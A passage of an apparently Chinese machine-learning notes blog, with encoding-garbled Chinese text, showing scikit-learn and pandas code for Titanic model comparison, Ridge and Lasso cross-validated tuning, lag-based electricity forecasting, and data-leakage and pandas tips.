class="string">&#x27;Parch&#x27;</span>]+<span class="number">1</span></span><br><span class="line">train.drop([<span class="string">&#x27;SibSp&#x27;</span>,<span class="string">&#x27;Parch&#x27;</span>],axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">train.Cabin = train.Cabin.<span class="built_in">map</span>(<span class="keyword">lambda</span> x : x[<span class="number">0</span>])</span><br><span class="line">train.Cabin.value_counts()</span><br><span class="line"></span><br><span class="line">train[<span class="string">&#x27;Name&#x27;</span>].<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x.split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]).value_counts()</span><br><span class="line">train[<span class="string">&#x27;Name&#x27;</span>]=train[<span class="string">&#x27;Name&#x27;</span>].<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x.split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">train.drop(<span class="string">&#x27;Ticket&#x27;</span>,axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">col = train.columns[train.dtypes == <span class="string">&quot;object&quot;</span>].tolist()</span><br><span class="line">col</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> col:</span><br><span class="line">    train = pd.concat([train,pd.get_dummies(train[c],prefix=<span class="built_in">str</span>(c))],axis=<span class="number">1</span>)</span><br><span class="line">    train.drop(c,inplace=<span class="literal">True</span>,axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">corrDf = train.corr()</span><br><span class="line">survived_rel=corrDf[<span class="string">&#x27;Survived&#x27;</span>].sort_values(ascending = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">Ytrain = train[<span class="string">&#x27;Survived&#x27;</span>]</span><br><span class="line">Xtrain = train.drop(<span class="string">&#x27;Survived&#x27;</span>,axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">%%time</span><br><span class="line"><span class="keyword">from</span> sklearn.pipeline <span class="keyword">import</span> Pipeline</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> MinMaxScaler</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> GradientBoostingClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.svm <span class="keyword">import</span> SVC</span><br><span class="line"><span class="keyword">from</span> sklearn.svm <span class="keyword">import</span> LinearSVC</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression,  SGDClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.naive_bayes <span class="keyword">import</span> GaussianNB</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> cross_val_score</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="comment"># prepare a list of ml models</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_models</span>(<span class="params">models=<span class="built_in">dict</span>(<span class="params"></span>)</span>):</span><br><span class="line">    <span class="comment"># linear models</span></span><br><span class="line">    models[<span class="string">&#x27;gbc&#x27;</span>] = GradientBoostingClassifier()</span><br><span class="line">    models[<span class="string">&#x27;rfc&#x27;</span>] = RandomForestClassifier()</span><br><span class="line">    models[<span class="string">&#x27;lr&#x27;</span>] = LogisticRegression()</span><br><span class="line">    models[<span class="string">&#x27;KNN&#x27;</span>] = KNeighborsClassifier()</span><br><span class="line">    models[<span class="string">&#x27;GaussianNB&#x27;</span>] =  GaussianNB()</span><br><span class="line">    models[<span class="string">&#x27;sgd&#x27;</span>] = SGDClassifier()</span><br><span class="line">    models[<span class="string">&#x27;lsvc&#x27;</span>] =LinearSVC()</span><br><span class="line">    models[<span class="string">&#x27;svc&#x27;</span>] = SVC()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Defined %d models&#x27;</span> % <span class="built_in">len</span>(models))</span><br><span class="line">    <span class="keyword">return</span> models</span><br><span class="line"><span class="comment"># create a feature preparation pipeline for a model</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_pipeline</span>(<span class="params">model,X, Y</span>):</span><br><span class="line">    steps = <span class="built_in">list</span>()</span><br><span class="line">    <span class="comment"># standardization</span></span><br><span class="line">    steps.append((<span class="string">&#x27;standardize&#x27;</span>, StandardScaler()))</span><br><span class="line">    <span class="comment"># normalization</span></span><br><span class="line">    steps.append((<span class="string">&#x27;normalize&#x27;</span>, MinMaxScaler()))</span><br><span class="line">    <span class="comment"># the model</span></span><br><span class="line">    steps.append((<span class="string">&#x27;model&#x27;</span>, model))</span><br><span class="line">    <span class="comment"># create pipeline</span></span><br><span class="line">    pipeline = Pipeline(steps)</span><br><span class="line">    <span class="keyword">return</span> cross_val_score(pipeline,X,Y,cv=<span class="number">4</span>).mean()</span><br><span class="line">dic = &#123;&#125;</span><br><span class="line">models = get_models()</span><br><span class="line"><span class="keyword">for</span> name, model <span class="keyword">in</span> models.items():</span><br><span class="line">    dic[name] = make_pipeline(model,Xtrain,Ytrain)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;model %s is done,score is %f&#x27;</span>%(name,dic[name]))</span><br><span class="line">order=<span class="built_in">sorted</span>(dic.items(),key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plot_data = pd.DataFrame(data=order)</span><br><span class="line">plot_data.columns = [<span class="string">&#x27;algo&#x27;</span>,<span class="string">&#x27;score&#x27;</span>]</span><br><span class="line">plot_data.set_index(<span class="string">&#x27;algo&#x27;</span>).plot.bar(figsize=(<span class="number">10</span>,<span class="number">6</span>))</span><br><span class="line">plt.xticks(rotation=<span class="number">360</span>)</span><br><span class="line"><span class="string">f&#x27;%s is the best,score is %f&#x27;</span>%(order[<span class="number">0</span>][<span class="number">0</span>],order[<span class="number">0</span>][<span class="number">1</span>])</span><br></pre></td></tr></table></figure><h3><span id="è°ƒä¼˜">è°ƒä¼˜</span></h3><p>å²­å›å½’å¯ä»¥è§£å†³ç‰¹å¾é—´çš„ç²¾ç¡®ç›¸å…³å…³ç³»å¯¼è‡´çš„æœ€å°äºŒä¹˜æ³•æ— æ³•ä½¿ç”¨çš„é—®é¢˜ï¼Œè€ŒLassoä¸è¡Œã€‚</p><p>ç”±äºLassoå¯¹æ­£åˆ™åŒ–ç³»æ•°çš„å˜åŠ¨è¿‡äºæ•æ„Ÿï¼Œå› æ­¤æˆ‘ä»¬å¾€å¾€è®© åœ¨å¾ˆå°çš„ç©ºé—´ä¸­å˜åŠ¨</p><h3><span id="ridge">Ridge</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">housevalue = fch()</span><br><span class="line">X = pd.DataFrame(housevalue.data) y = housevalue.target</span><br><span class="line">X.columns = [<span class="string">&quot;ä½æˆ·æ”¶å…¥ä¸­ä½æ•°&quot;</span>,<span class="string">&quot;æˆ¿å±‹ä½¿ç”¨å¹´ä»£ä¸­ä½æ•°&quot;</span>,<span class="string">&quot;å¹³å‡æˆ¿é—´æ•°ç›®&quot;</span></span><br><span class="line"> Â  Â  Â  Â  Â  ,<span class="string">&quot;å¹³å‡å§å®¤æ•°ç›®&quot;</span>,<span class="string">&quot;è¡—åŒºäººå£&quot;</span>,<span class="string">&quot;å¹³å‡å…¥ä½ç‡&quot;</span>,<span class="string">&quot;è¡—åŒºçš„çº¬åº¦&quot;</span>,<span class="string">&quot;è¡—åŒºçš„ç»åº¦&quot;</span>]</span><br><span class="line">Ridge_ = RidgeCV(alphas=np.arange(<span class="number">1</span>,<span class="number">1001</span>,<span class="number">100</span>)</span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  Â <span class="comment">#,scoring=&quot;neg_mean_squared_error&quot;</span></span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  Â  ,store_cv_values=<span class="literal">True</span></span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  Â <span class="comment">#,cv=5</span></span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  ).fit(X, y)</span><br><span class="line"></span><br><span class="line">Ridge_.score(X,y) <span class="comment">#è°ƒç”¨æ‰€æœ‰äº¤å‰éªŒè¯çš„ç»“æœ</span></span><br><span class="line">Ridge_.cv_values_.shape</span><br><span class="line"><span class="comment">#è¿›è¡Œå¹³å‡åå¯ä»¥æŸ¥çœ‹æ¯ä¸ªæ­£åˆ™åŒ–ç³»æ•°å–å€¼ä¸‹çš„äº¤å‰éªŒè¯ç»“æœ</span></span><br><span class="line">Ridge_.cv_values_.mean(axis=<span class="number">0</span>) <span class="comment">#æŸ¥çœ‹è¢«é€‰æ‹©å‡ºæ¥çš„æœ€ä½³æ­£åˆ™åŒ–ç³»æ•°</span></span><br><span class="line">Ridge_.alpha_</span><br></pre></td></tr></table></figure><h3><span id="lasso">Lasso</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LassoCV</span><br><span class="line"><span class="comment">#è‡ªå·±å»ºç«‹Lassoè¿›è¡Œalphaé€‰æ‹©çš„èŒƒå›´</span></span><br><span class="line">alpharange = np.logspace(-<span class="number">10</span>, -<span class="number">2</span>, <span class="number">200</span>,base=<span class="number">10</span>) <span class="comment">#å…¶å®æ˜¯å½¢æˆ10ä¸ºåº•çš„æŒ‡æ•°å‡½æ•°</span></span><br><span class="line"><span class="comment">#10**(-10)åˆ°10**(-2)æ¬¡æ–¹</span></span><br><span class="line">alpharange.shape</span><br><span class="line">Xtrain.head()</span><br><span class="line">lasso_ = LassoCV(alphas=alpharange <span class="comment">#è‡ªè¡Œè¾“å…¥çš„alphaçš„å–å€¼èŒƒå›´</span></span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  ,cv=<span class="number">5</span> <span class="comment">#äº¤å‰éªŒè¯çš„æŠ˜æ•°</span></span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  ).fit(Xtrain, Ytrain) <span class="comment">#æŸ¥çœ‹è¢«é€‰æ‹©å‡ºæ¥çš„æœ€ä½³æ­£åˆ™åŒ–ç³»æ•°</span></span><br><span class="line">lasso_.alpha_</span><br><span class="line"><span class="comment">#è°ƒç”¨æ‰€æœ‰äº¤å‰éªŒè¯çš„ç»“æœ</span></span><br><span class="line">lasso_.mse_path_</span><br><span class="line">lasso_.mse_path_.shape <span class="comment">#è¿”å›æ¯ä¸ªalphaä¸‹çš„äº”æŠ˜äº¤å‰éªŒè¯ç»“æœ</span></span><br><span class="line">lasso_.mse_path_.mean(axis=<span class="number">1</span>) <span class="comment">#æœ‰æ³¨æ„åˆ°åœ¨å²­å›å½’ä¸­æˆ‘ä»¬çš„è½´å‘æ˜¯axis=0å—ï¼Ÿ</span></span><br><span class="line"><span class="comment">#åœ¨å²­å›å½’å½“ä¸­ï¼Œæˆ‘ä»¬æ˜¯ç•™ä¸€éªŒè¯ï¼Œå› æ­¤æˆ‘ä»¬çš„äº¤å‰éªŒè¯ç»“æœè¿”å›çš„æ˜¯ï¼Œæ¯ä¸€ä¸ªæ ·æœ¬åœ¨æ¯ä¸ªalphaä¸‹çš„äº¤å‰éªŒè¯ç»“æœ</span></span><br><span class="line"><span class="comment">#å› æ­¤æˆ‘ä»¬è¦æ±‚æ¯ä¸ªalphaä¸‹çš„äº¤å‰éªŒè¯å‡å€¼ï¼Œå°±æ˜¯axis=0ï¼Œè·¨è¡Œæ±‚å‡å€¼</span></span><br><span class="line"><span class="comment">#è€Œåœ¨è¿™é‡Œï¼Œæˆ‘ä»¬è¿”å›çš„æ˜¯ï¼Œæ¯ä¸€ä¸ªalphaå–å€¼ä¸‹ï¼Œæ¯ä¸€æŠ˜äº¤å‰éªŒè¯çš„ç»“æœ</span></span><br><span class="line"><span class="comment">#å› æ­¤æˆ‘ä»¬è¦æ±‚æ¯ä¸ªalphaä¸‹çš„äº¤å‰éªŒè¯å‡å€¼ï¼Œå°±æ˜¯axis=1ï¼Œè·¨åˆ—æ±‚å‡å€¼</span></span><br><span class="line"><span class="comment">#æœ€ä½³æ­£åˆ™åŒ–ç³»æ•°ä¸‹è·å¾—çš„æ¨¡å‹çš„ç³»æ•°ç»“æœ</span></span><br><span class="line">lasso_.coef_</span><br><span class="line">lasso_.score(Xtest,Ytest) <span class="comment">#ä¸çº¿æ€§å›å½’ç›¸æ¯”å¦‚ä½•ï¼Ÿ</span></span><br><span class="line">reg = LinearRegression().fit(Xtrain,Ytrain)</span><br><span class="line">reg.score(Xtest,Ytest) <span class="comment">#ä½¿ç”¨lassoCVè‡ªå¸¦çš„æ­£åˆ™åŒ–è·¯å¾„é•¿åº¦å’Œè·¯å¾„ä¸­çš„alphaä¸ªæ•°æ¥è‡ªåŠ¨å»ºç«‹alphaé€‰æ‹©çš„èŒƒå›´</span></span><br><span class="line">ls_ = LassoCV(eps=<span class="number">0.00001</span></span><br><span class="line"> Â  Â  Â  Â  Â  Â  ,n_alphas=<span class="number">300</span></span><br><span class="line"> Â  Â  Â  Â  Â  Â  ,cv=<span class="number">5</span></span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  ).fit(Xtrain, Ytrain)</span><br><span class="line">ls_.alpha_</span><br><span class="line">ls_.alphas_ <span class="comment">#æŸ¥çœ‹æ‰€æœ‰è‡ªåŠ¨ç”Ÿæˆçš„alphaå–å€¼</span></span><br><span class="line">ls_.alphas_.shape</span><br><span class="line">ls_.score(Xtest,Ytest)</span><br><span class="line">ls_.coef_</span><br></pre></td></tr></table></figure><h3><span id="å¤šæ­¥é•¿æ—¶é—´åºåˆ—">å¤šæ­¥é•¿æ—¶é—´åºåˆ—</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># import</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line">pd.set_option(<span class="string">&#x27;display.max_columns&#x27;</span>, <span class="literal">None</span>) <span class="comment"># å±•ç¤ºæ‰€æœ‰åˆ—</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ•°æ®å¤„ç†</span></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;data.csv&#x27;</span>)</span><br><span class="line">df[<span class="string">&#x27;Date&#x27;</span>] = pd.to_datetime(df[<span class="string">&#x27;Date&#x27;</span>])</span><br><span class="line">df[<span class="string">&#x27;month&#x27;</span>] = df[<span class="string">&#x27;Date&#x27;</span>].dt.month</span><br><span class="line">df[<span class="string">&#x27;dayofweek&#x27;</span>] = df[<span class="string">&#x27;Date&#x27;</span>].dt.dayofweek</span><br><span class="line">df[[<span class="string">&#x27;holiday&#x27;</span>,<span class="string">&#x27;month&#x27;</span>,<span class="string">&#x27;dayofweek&#x27;</span>]] = df[[<span class="string">&#x27;holiday&#x27;</span>,<span class="string">&#x27;month&#x27;</span>,<span class="string">&#x27;dayofweek&#x27;</span>]].astype(<span class="string">&#x27;object&#x27;</span>)</span><br><span class="line">df = pd.get_dummies(df)</span><br><span class="line">df.drop(<span class="string">&#x27;Season&#x27;</span>,inplace=<span class="literal">True</span>,axis=<span class="number">1</span>)</span><br><span class="line">df.info()</span><br><span class="line">df.set_index(<span class="string">&#x27;Date&#x27;</span>,inplace=<span class="literal">True</span>)</span><br><span class="line">data = df.copy()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›¸å…³å‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_lag</span>(<span class="params">df,l_beg = <span class="number">1</span>,l_end = <span class="number">32</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l_beg,l_end):</span><br><span class="line">        df[<span class="string">&#x27;lag_&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i)] = df.DailyElectricity.shift(i)</span><br><span class="line">    <span class="keyword">return</span> df</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_data</span>(<span class="params">n_days,df,indx</span>):</span><br><span class="line">    Y_val = df.iloc[-n_days:,indx].copy()</span><br><span class="line">    df.iloc[-n_days:,indx]=<span class="number">0</span></span><br><span class="line">    make_lag(df)</span><br><span class="line">    X_val = df.iloc[-n_days:].drop(<span class="string">&#x27;DailyElectricity&#x27;</span>,axis=<span class="number">1</span>)</span><br><span class="line">    df.dropna(inplace=<span class="literal">True</span>)</span><br><span class="line">    X = df[:-n_days].drop(<span class="string">&#x27;DailyElectricity&#x27;</span>,axis=<span class="number">1</span>)</span><br><span class="line">    Y = df[:-n_days][<span class="string">&#x27;DailyElectricity&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> X,Y,X_val,Y_val</span><br><span class="line">  </span><br><span class="line">df = data.copy()</span><br><span class="line">X,Y,X_val,Y_val = split_data(<span class="number">365</span>,df,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.pipeline <span class="keyword">import</span> Pipeline</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> AdaBoostRegressor,RandomForestRegressor,GradientBoostingRegressor</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression,Lasso,LassoLars,SGDRegressor,Ridge</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> cross_val_score</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_models</span>(<span class="params">models=&#123;&#125;</span>):</span><br><span class="line">    models[<span class="string">&#x27;AdaBoostRegressor&#x27;</span>]=AdaBoostRegressor()</span><br><span class="line">    models[<span class="string">&#x27;RandomForestRegressor&#x27;</span>]=RandomForestRegressor()</span><br><span class="line">    models[<span class="string">&#x27;GradientBoostingRegressor&#x27;</span>]=GradientBoostingRegressor()</span><br><span class="line">    models[<span class="string">&#x27;LinearRegression&#x27;</span>]=LinearRegression()</span><br><span class="line">    models[<span class="string">&#x27;Lasso&#x27;</span>]=Lasso()</span><br><span class="line">    models[<span class="string">&#x27;LassoLars&#x27;</span>]=LassoLars()</span><br><span class="line">    models[<span class="string">&#x27;SGDRegressor&#x27;</span>]=SGDRegressor()</span><br><span class="line">    models[<span class="string">&#x27;Ridge&#x27;</span>]=Ridge()</span><br><span class="line">    <span class="keyword">return</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_pipe</span>(<span class="params">model</span>):</span><br><span class="line">    steps = [(<span class="string">&#x27;s&#x27;</span>,StandardScaler()),(<span class="string">&#x27;m&#x27;</span>,model)]</span><br><span class="line">    <span class="keyword">return</span> Pipeline(steps)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">val</span>(<span class="params">model,x,y,cv=<span class="number">10</span></span>):</span><br><span class="line">    <span class="keyword">return</span> cross_val_score(model,X,Y,cv=cv).mean()</span><br><span class="line"></span><br><span class="line">s = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> n,m <span class="keyword">in</span> get_models().items():</span><br><span class="line">    p = make_pipe(m)</span><br><span class="line">    s[n]=val(m,X,Y)</span><br><span class="line">order = <span class="built_in">sorted</span>(s.items(),key = <span class="keyword">lambda</span> x:x[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line">order</span><br><span class="line"></span><br><span class="line">pipe = make_pipe(GradientBoostingRegressor())</span><br><span class="line">best_model = pipe.fit(X,Y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pred_date</span>(<span class="params">X_val</span>):</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(X_val.shape[<span class="number">0</span>]):</span><br><span class="line">        pred = best_model.predict(np.array(X_val.iloc[i]).reshape(<span class="number">1</span>,-<span class="number">1</span>))</span><br><span class="line">        res.append(pred)</span><br><span class="line">        <span class="keyword">if</span> i+<span class="number">1</span> &lt; X_val.shape[<span class="number">0</span>]:</span><br><span class="line">            X_val.iloc[i+<span class="number">1</span>,-<span class="number">30</span>:] = X_val.iloc[i,-<span class="number">31</span>:-<span class="number">1</span>]</span><br><span class="line">            X_val.iloc[i+<span class="number">1</span>,-<span class="number">31</span>]=pred</span><br><span class="line">    <span class="keyword">return</span> X_val,res</span><br><span class="line">  </span><br><span class="line">X_val,res = pred_date(X_val) </span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> r2_score,mean_squared_error</span><br><span class="line">mean_squared_error(Y_val,res)</span><br><span class="line">r2_score(Y_val,res)</span><br></pre></td></tr></table></figure><h2><span id="è¸©å‘">è¸©å‘</span></h2><ul><li>å…³äºæ•°æ®é¢„å¤„ç†</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">é¢„å¤„ç†çš„æ—¶å€™ä¸èƒ½</span></span><br><span class="line"><span class="string">scaler.fit_trainsform(Xtest)</span></span><br><span class="line"><span class="string">æˆ–è€…</span></span><br><span class="line"><span class="string">scaler.fit(Xtest)</span></span><br><span class="line"><span class="string">scaler.transform(Xtest)</span></span><br><span class="line"><span class="string">å› ä¸ºä¼šå¯¼è‡´æ•°æ®æ³„éœ²</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">scaler = StandardScaler() <span class="comment">#å®ä¾‹åŒ–</span></span><br><span class="line">scaler.fit(Xtrain)</span><br><span class="line">X_train =scaler.transform(Xtrain)</span><br><span class="line">X_test =scaler.transform(Xtest)</span><br><span class="line">norm = MinMaxScaler()</span><br><span class="line">norm.fit(Xtrain)</span><br><span class="line">X_train = norm.transform(Xtrain)</span><br><span class="line">X_test = norm.transform(Xtest)</span><br><span class="line"></span><br><span class="line">scaler = StandardScaler() <span class="comment">#å®ä¾‹åŒ–</span></span><br><span class="line">X_train =scaler.fit_transform(Xtrain)</span><br><span class="line">X_test =scaler.transform(Xtest)</span><br><span class="line">norm = MinMaxScaler()</span><br><span class="line">norm.fit(Xtrain)</span><br><span class="line">X_train = norm.fit_transform(Xtrain)</span><br><span class="line">X_test = norm.transform(Xtest)</span><br></pre></td></tr></table></figure><ul><li><p>å…³äºé¢„æµ‹</p><p>é¢„æµ‹çš„æ—¶å€™è¦å°†æ•´ä¸ªæ•°æ®æ‹¿å»fit,ç„¶åå†å»predict</p></li></ul><h2><span id="trick">Trick</span></h2><ul><li><p>get_dummiesçš„æ—¶å€™æœ€å¥½å…ˆæŠŠ é¢„æµ‹é›†å’Œæµ‹è¯•é›†åˆå¹¶å†åˆ†å¼€X[:x.shape[0]]</p></li><li><p>factorizedè½¬æ¢å›å»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">orig_col = [<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;b&#x27;</span>]</span><br><span class="line">labels, uniques = pd.factorize(orig_col)</span><br><span class="line"></span><br><span class="line"><span class="comment"># To get original list back</span></span><br><span class="line">uniques[labels]</span><br><span class="line"><span class="comment"># array([&#x27;b&#x27;, &#x27;b&#x27;, &#x27;a&#x27;, &#x27;c&#x27;, &#x27;b&#x27;], dtype=object)</span></span><br></pre></td></tr></table></figure></li><li><p>pandasæ”¹å˜è¡Œåºåˆ—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">col=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>]</span><br><span class="line">df[col]</span><br></pre></td></tr></table></figure></li><li><p>æŒ‰æœˆä»½ç»Ÿè®¡ </p><ul><li>A æ˜ŸæœŸ</li><li>B æœˆä»½</li></ul><p><code>df.groupby(df[&#39;date&#39;].dt.strftime(&#39;%B&#39;))[&#39;price&#39;].mean()</code></p><p><code>df[&#39;month&#39;] = df[&#39;Date&#39;].dt.month</code></p></li><li><p>æ’åºåæŒ‰è‡ªå®šä¹‰é¡ºåºæ˜¾ç¤º</p><p><code>cat = [&#39;a&#39;,&#39;b&#39;,&#39;c&#39;]</code></p><p><code>df.groupby(&#39;f&#39;).reindex(cat)</code></p></li><li><p>é€è§†</p><p><code>df = df.groupby(&#39;name&#39;,&#39;year&#39;)[&#39;gdp&#39;].sum().reindex()</code></p><p><code>df.pivot(index=&#39;name&#39;,columns=&#39;year&#39;,values=&#39;gdp&#39;)</code></p><p>![é€è§†å‰](&#x2F;Users&#x2F;disda&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220310161405868.png)</p><p>![é€è§†å](&#x2F;Users&#x2F;disda&#x2F;Library&#x2F;Application 